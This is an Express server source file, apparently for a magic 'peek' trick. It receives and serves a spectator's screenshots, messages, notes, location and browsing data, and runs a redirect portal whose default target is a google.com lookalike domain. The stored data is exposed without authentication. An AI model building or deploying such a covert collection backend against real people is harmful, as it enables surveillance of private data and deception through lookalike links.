const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

// 15mb limit supports two base64 screenshots plus standard JSON requests
app.use(express.json({ limit: '15mb' }));

// Built-in CORS & Safari Cache-Control headers
app.use((req, res, next) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ==================================================
// 1. KEEP-ALIVE HEALTH ROUTE
// ==================================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ==================================================
// 2. SCREENSHOT RECEIVER ROUTES (/api/submit & /api/latest)
// ==================================================
let latestSubmission = {
  personal_info_b64: null,
  phone_number_b64: null,
  notes: null,
  messages: null,
  hotspot: null,
  location: null,
  safari: null,
  timestamp: null
};

app.post('/api/submit', (req, res) => {
  try {
    const {
      personal_info_b64,
      phone_number_b64,
      notes,
      messages,
      hotspot,
      location,
      safari
    } = req.body;

    if (
      !personal_info_b64 ||
      !phone_number_b64 ||
      notes === undefined ||
      messages === undefined ||
      hotspot === undefined ||
      location === undefined ||
      safari === undefined
    ) {
      return res.status(400).json({
        success: false,
        error: 'Missing required fields'
      });
    }

    latestSubmission = {
      personal_info_b64,
      phone_number_b64,
      notes,
      messages,
      hotspot,
      location,
      safari,
      timestamp: Date.now()
    };

    return res.status(200).json({ success: true, message: 'Stored!' });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/latest', (req, res) => {
  if (!latestSubmission.personal_info_b64) {
    return res.status(404).json({ success: false, error: 'No data yet' });
  }
  return res.status(200).json({
    success: true,
    personal_info_b64: latestSubmission.personal_info_b64,
    phone_number_b64: latestSubmission.phone_number_b64,
    notes: latestSubmission.notes,
    messages: latestSubmission.messages,
    hotspot: latestSubmission.hotspot,
    location: latestSubmission.location,
    safari: latestSubmission.safari,
    timestamp: latestSubmission.timestamp
  });
});

// ==================================================
// 3. MAGIC LINKS PORTAL ROUTES
// ==================================================
const DATA_FILE = path.join(__dirname, 'data.json');

const defaultData = {
  masterRedirect: 'https://gooqlc.com/111z',
  links: [
    { id: '1', title: 'Google', url: 'https://google.com' },
    { id: '2', title: 'Predict and Peek', url: 'https://www.icloud.com/shortcuts/' }
  ]
};

function getPortalData() {
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(defaultData, null, 2));
    return defaultData;
  }
  try {
    const raw = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    if (!raw.links && (raw.top || raw.custom)) {
      raw.links = [...(raw.top || []), ...(raw.custom || [])];
      delete raw.top;
      delete raw.custom;
      delete raw.dividerTitle;
      fs.writeFileSync(DATA_FILE, JSON.stringify(raw, null, 2));
    }
    return raw;
  } catch (err) {
    return defaultData;
  }
}

function savePortalData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Spectator Route
app.get('/', (req, res) => {
  const indexFile = path.join(__dirname, 'index.html');
  if (fs.existsSync(indexFile)) {
    res.sendFile(indexFile);
  } else {
    res.status(200).send('Server is live. Add index.html to your GitHub repo to view the spectator page.');
  }
});

// Controller Web App Route
app.get('/app', (req, res) => {
  const appFile = path.join(__dirname, 'app.html');
  if (fs.existsSync(appFile)) {
    res.sendFile(appFile);
  } else {
    res.status(200).send('Please create app.html in your GitHub repo.');
  }
});

// Portal API Endpoints
app.get('/api/portal', (req, res) => {
  res.status(200).json({ success: true, ...getPortalData() });
});

app.post('/api/save', (req, res) => {
  const { masterRedirect, links } = req.body;
  const current = getPortalData();
  const updated = {
    masterRedirect: masterRedirect || current.masterRedirect,
    links: Array.isArray(links) ? links : current.links
  };
  savePortalData(updated);
  return res.status(200).json({ success: true, data: updated });
});

app.all('/api/set-redirect', (req, res) => {
  const newUrl = req.body?.url || req.query?.url;
  if (!newUrl) return res.status(400).json({ success: false, error: 'Missing url' });
  const data = getPortalData();
  data.masterRedirect = newUrl;
  savePortalData(data);
  return res.status(200).json({ success: true, masterRedirect: data.masterRedirect });
});

app.all('/api/update-link', (req, res) => {
  const id = req.body?.id || req.query?.id;
  const newTitle = req.body?.title || req.query?.title;
  const newUrl = req.body?.url || req.query?.url;
  if (!id) return res.status(400).json({ success: false, error: 'Missing id' });

  const data = getPortalData();
  const target = (data.links || []).find(item => item.id === String(id));
  if (!target) return res.status(404).json({ success: false, error: 'Link not found' });

  if (newTitle) target.title = newTitle;
  if (newUrl) target.url = newUrl;
  savePortalData(data);
  return res.status(200).json({ success: true, updated: target });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Combined server running on port ${PORT}`);
});
